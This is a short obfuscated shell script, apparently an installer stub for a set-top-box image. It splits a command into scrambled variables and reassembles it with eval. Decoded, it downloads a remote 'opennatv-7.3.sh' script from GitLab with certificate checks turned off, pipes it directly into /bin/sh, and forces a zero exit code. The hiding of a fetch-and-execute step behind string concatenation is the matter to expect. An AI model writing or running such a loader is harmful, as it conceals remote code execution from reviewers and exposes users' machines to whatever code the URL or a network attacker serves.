z="
";Jz='/git';Lz='com/';Yz=' | /';Kz='lab.';Nz='nabi';Zz='bin/';Rz='raw/';Cz='no-c';Vz='-7.3';Hz=' htt';Pz='mage';Xz='-O -';Ez='-cer';Tz='/ope';cz=' 0';Mz='emil';Wz='.sh ';Fz='tifi';Uz='natv';Gz='cate';Dz='heck';bz='exit';Oz='l1/i';Bz='  --';Qz='s/-/';Iz='ps:/';az='sh';Sz='main';Az='wget';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz"